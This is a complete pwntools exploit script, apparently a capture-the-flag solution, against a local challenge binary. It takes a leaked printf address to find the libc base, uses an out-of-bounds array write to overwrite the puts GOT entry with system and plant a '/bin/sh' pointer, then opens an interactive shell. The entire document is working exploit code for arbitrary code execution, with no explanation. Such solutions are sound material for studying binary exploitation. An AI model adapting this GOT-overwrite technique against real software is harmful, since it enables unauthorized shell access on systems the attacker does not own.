from pwn import *

io = process("../challenge/chall")
elf = ELF("../challenge/chall")

if args.REMOTE:
    io = remote("0.0.0.0", 1337)
    libc = ELF("../challenge/libc.so.6")
else:
    libc = elf.libc
    io = process("../challenge/chall")


if args.GDB:
    gdb.attach(io)

def write(index, value):
    io.sendline(str(index))

    io.sendline(str(value))

io.recvline()
leak = int(io.recvline().decode(), 16)

libc.address = leak-libc.sym["printf"]

write((elf.sym["msg"] - elf.sym["members"])//8, next(libc.search(b"/bin/sh")))

write((elf.got["puts"]-elf.sym["members"])//8, libc.sym["system"])

io.interactive()
